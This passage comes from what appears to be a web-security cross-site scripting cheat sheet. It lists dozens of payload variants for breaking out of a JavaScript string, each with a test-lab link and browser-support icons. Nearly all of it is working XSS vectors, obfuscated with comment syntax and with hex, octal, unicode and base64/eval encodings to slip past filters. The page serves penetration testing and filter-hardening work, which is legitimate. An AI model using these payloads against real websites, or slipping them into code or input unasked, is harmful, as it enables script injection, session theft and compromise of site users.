Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: comment syntax (top)\n\n[`';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Btop%5B%2F%2Afoo%2A%2F%27alert%27%2F%2Abar%2A%2F%5D%28top%5B%2F%2Afoo%2A%2F%27document%27%2F%2Abar%2A%2F%5D%5B%27domain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-comment-syntax-top)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: comment syntax (parent)\n\n[`';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bparent%5B%2F%2Afoo%2A%2F%27alert%27%2F%2Abar%2A%2F%5D%28parent%5B%2F%2Afoo%2A%2F%27document%27%2F%2Abar%2A%2F%5D%5B%27domain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-comment-syntax-parent)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: comment syntax (frames)\n\n[`';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bframes%5B%2F%2Afoo%2A%2F%27alert%27%2F%2Abar%2A%2F%5D%28frames%5B%2F%2Afoo%2A%2F%27document%27%2F%2Abar%2A%2F%5D%5B%27domain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-comment-syntax-frames)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: comment syntax (globalThis)\n\n[`';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3BglobalThis%5B%2F%2Afoo%2A%2F%27alert%27%2F%2Abar%2A%2F%5D%28globalThis%5B%2F%2Afoo%2A%2F%27document%27%2F%2Abar%2A%2F%5D%5B%27domain%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-comment-syntax-globalthis)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence (window)\n\n[`';window['\\x61\\x6c\\x65\\x72\\x74'](window['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bwindow%5B%27%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%27%5D%28window%5B%27%5Cx64%5Cx6f%5Cx63%5Cx75%5Cx6d%5Cx65%5Cx6e%5Cx74%27%5D%5B%27%5Cx64%5Cx6f%5Cx6d%5Cx61%5Cx69%5Cx6e%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-window)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence (self)\n\n[`';self['\\x61\\x6c\\x65\\x72\\x74'](self['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bself%5B%27%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%27%5D%28self%5B%27%5Cx64%5Cx6f%5Cx63%5Cx75%5Cx6d%5Cx65%5Cx6e%5Cx74%27%5D%5B%27%5Cx64%5Cx6f%5Cx6d%5Cx61%5Cx69%5Cx6e%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-self)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence (this)\n\n[`';this['\\x61\\x6c\\x65\\x72\\x74'](this['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bthis%5B%27%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%27%5D%28this%5B%27%5Cx64%5Cx6f%5Cx63%5Cx75%5Cx6d%5Cx65%5Cx6e%5Cx74%27%5D%5B%27%5Cx64%5Cx6f%5Cx6d%5Cx61%5Cx69%5Cx6e%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-this)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence (top)\n\n[`';top['\\x61\\x6c\\x65\\x72\\x74'](top['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Btop%5B%27%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%27%5D%28top%5B%27%5Cx64%5Cx6f%5Cx63%5Cx75%5Cx6d%5Cx65%5Cx6e%5Cx74%27%5D%5B%27%5Cx64%5Cx6f%5Cx6d%5Cx61%5Cx69%5Cx6e%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-top)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence (parent)\n\n[`';parent['\\x61\\x6c\\x65\\x72\\x74'](parent['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bparent%5B%27%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%27%5D%28parent%5B%27%5Cx64%5Cx6f%5Cx63%5Cx75%5Cx6d%5Cx65%5Cx6e%5Cx74%27%5D%5B%27%5Cx64%5Cx6f%5Cx6d%5Cx61%5Cx69%5Cx6e%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-parent)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence (frames)\n\n[`';frames['\\x61\\x6c\\x65\\x72\\x74'](frames['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bframes%5B%27%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%27%5D%28frames%5B%27%5Cx64%5Cx6f%5Cx63%5Cx75%5Cx6d%5Cx65%5Cx6e%5Cx74%27%5D%5B%27%5Cx64%5Cx6f%5Cx6d%5Cx61%5Cx69%5Cx6e%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-frames)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence (globalThis)\n\n[`';globalThis['\\x61\\x6c\\x65\\x72\\x74'](globalThis['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3BglobalThis%5B%27%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%27%5D%28globalThis%5B%27%5Cx64%5Cx6f%5Cx63%5Cx75%5Cx6d%5Cx65%5Cx6e%5Cx74%27%5D%5B%27%5Cx64%5Cx6f%5Cx6d%5Cx61%5Cx69%5Cx6e%27%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-globalthis)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence and base64 encoded string (window)\n\n[`';window['\\x65\\x76\\x61\\x6c']('window[\"\\x61\\x6c\\x65\\x72\\x74\"](window[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bwindow%5B%27%5Cx65%5Cx76%5Cx61%5Cx6c%27%5D%28%27window%5B%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22%5D%28window%5B%22%5Cx61%5Cx74%5Cx6f%5Cx62%22%5D%28%22WFNT%22%29%29%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-window)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence and base64 encoded string (self)\n\n[`';self['\\x65\\x76\\x61\\x6c']('self[\"\\x61\\x6c\\x65\\x72\\x74\"](self[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bself%5B%27%5Cx65%5Cx76%5Cx61%5Cx6c%27%5D%28%27self%5B%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22%5D%28self%5B%22%5Cx61%5Cx74%5Cx6f%5Cx62%22%5D%28%22WFNT%22%29%29%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-self)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence and base64 encoded string (this)\n\n[`';this['\\x65\\x76\\x61\\x6c']('this[\"\\x61\\x6c\\x65\\x72\\x74\"](this[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bthis%5B%27%5Cx65%5Cx76%5Cx61%5Cx6c%27%5D%28%27this%5B%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22%5D%28this%5B%22%5Cx61%5Cx74%5Cx6f%5Cx62%22%5D%28%22WFNT%22%29%29%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-this)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence and base64 encoded string (top)\n\n[`';top['\\x65\\x76\\x61\\x6c']('top[\"\\x61\\x6c\\x65\\x72\\x74\"](top[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Btop%5B%27%5Cx65%5Cx76%5Cx61%5Cx6c%27%5D%28%27top%5B%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22%5D%28top%5B%22%5Cx61%5Cx74%5Cx6f%5Cx62%22%5D%28%22WFNT%22%29%29%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-top)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence and base64 encoded string (parent)\n\n[`';parent['\\x65\\x76\\x61\\x6c']('parent[\"\\x61\\x6c\\x65\\x72\\x74\"](parent[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bparent%5B%27%5Cx65%5Cx76%5Cx61%5Cx6c%27%5D%28%27parent%5B%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22%5D%28parent%5B%22%5Cx61%5Cx74%5Cx6f%5Cx62%22%5D%28%22WFNT%22%29%29%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-parent)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence and base64 encoded string (frames)\n\n[`';frames['\\x65\\x76\\x61\\x6c']('frames[\"\\x61\\x6c\\x65\\x72\\x74\"](frames[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bframes%5B%27%5Cx65%5Cx76%5Cx61%5Cx6c%27%5D%28%27frames%5B%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22%5D%28frames%5B%22%5Cx61%5Cx74%5Cx6f%5Cx62%22%5D%28%22WFNT%22%29%29%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-frames)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: hex escape sequence and base64 encoded string (globalThis)\n\n[`';globalThis['\\x65\\x76\\x61\\x6c']('globalThis[\"\\x61\\x6c\\x65\\x72\\x74\"](globalThis[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3BglobalThis%5B%27%5Cx65%5Cx76%5Cx61%5Cx6c%27%5D%28%27globalThis%5B%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22%5D%28globalThis%5B%22%5Cx61%5Cx74%5Cx6f%5Cx62%22%5D%28%22WFNT%22%29%29%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-globalthis)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: octal escape sequence (window)\n\n[`';window['\\141\\154\\145\\162\\164']('\\130\\123\\123');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bwindow%5B%27%5C141%5C154%5C145%5C162%5C164%27%5D%28%27%5C130%5C123%5C123%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-octal-escape-sequence-window)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: octal escape sequence (self)\n\n[`';self['\\141\\154\\145\\162\\164']('\\130\\123\\123');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bself%5B%27%5C141%5C154%5C145%5C162%5C164%27%5D%28%27%5C130%5C123%5C123%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-octal-escape-sequence-self)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: octal escape sequence (this)\n\n[`';this['\\141\\154\\145\\162\\164']('\\130\\123\\123');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bthis%5B%27%5C141%5C154%5C145%5C162%5C164%27%5D%28%27%5C130%5C123%5C123%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-octal-escape-sequence-this)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: octal escape sequence (top)\n\n[`';top['\\141\\154\\145\\162\\164']('\\130\\123\\123');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Btop%5B%27%5C141%5C154%5C145%5C162%5C164%27%5D%28%27%5C130%5C123%5C123%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-octal-escape-sequence-top)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: octal escape sequence (parent)\n\n[`';parent['\\141\\154\\145\\162\\164']('\\130\\123\\123');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bparent%5B%27%5C141%5C154%5C145%5C162%5C164%27%5D%28%27%5C130%5C123%5C123%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-octal-escape-sequence-parent)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: octal escape sequence (frames)\n\n[`';frames['\\141\\154\\145\\162\\164']('\\130\\123\\123');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bframes%5B%27%5C141%5C154%5C145%5C162%5C164%27%5D%28%27%5C130%5C123%5C123%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-octal-escape-sequence-frames)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: octal escape sequence (globalThis)\n\n[`';globalThis['\\141\\154\\145\\162\\164']('\\130\\123\\123');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3BglobalThis%5B%27%5C141%5C154%5C145%5C162%5C164%27%5D%28%27%5C130%5C123%5C123%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-octal-escape-sequence-globalthis)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: unicode escape (window)\n\n[`';window['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bwindow%5B%27%5Cu%7B0061%7D%5Cu%7B006c%7D%5Cu%7B0065%7D%5Cu%7B0072%7D%5Cu%7B0074%7D%27%5D%28%27%5Cu%7B0058%7D%5Cu%7B0053%7D%5Cu%7B0053%7D%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-unicode-escape-window)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: unicode escape (self)\n\n[`';self['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bself%5B%27%5Cu%7B0061%7D%5Cu%7B006c%7D%5Cu%7B0065%7D%5Cu%7B0072%7D%5Cu%7B0074%7D%27%5D%28%27%5Cu%7B0058%7D%5Cu%7B0053%7D%5Cu%7B0053%7D%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-unicode-escape-self)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: unicode escape (this)\n\n[`';this['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bthis%5B%27%5Cu%7B0061%7D%5Cu%7B006c%7D%5Cu%7B0065%7D%5Cu%7B0072%7D%5Cu%7B0074%7D%27%5D%28%27%5Cu%7B0058%7D%5Cu%7B0053%7D%5Cu%7B0053%7D%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-unicode-escape-this)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: unicode escape (top)\n\n[`';top['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Btop%5B%27%5Cu%7B0061%7D%5Cu%7B006c%7D%5Cu%7B0065%7D%5Cu%7B0072%7D%5Cu%7B0074%7D%27%5D%28%27%5Cu%7B0058%7D%5Cu%7B0053%7D%5Cu%7B0053%7D%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-unicode-escape-top)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: unicode escape (parent)\n\n[`';parent['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bparent%5B%27%5Cu%7B0061%7D%5Cu%7B006c%7D%5Cu%7B0065%7D%5Cu%7B0072%7D%5Cu%7B0074%7D%27%5D%28%27%5Cu%7B0058%7D%5Cu%7B0053%7D%5Cu%7B0053%7D%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-unicode-escape-parent)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: unicode escape (frames)\n\n[`';frames['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bframes%5B%27%5Cu%7B0061%7D%5Cu%7B006c%7D%5Cu%7B0065%7D%5Cu%7B0072%7D%5Cu%7B0074%7D%27%5D%28%27%5Cu%7B0058%7D%5Cu%7B0053%7D%5Cu%7B0053%7D%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-unicode-escape-frames)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: unicode escape 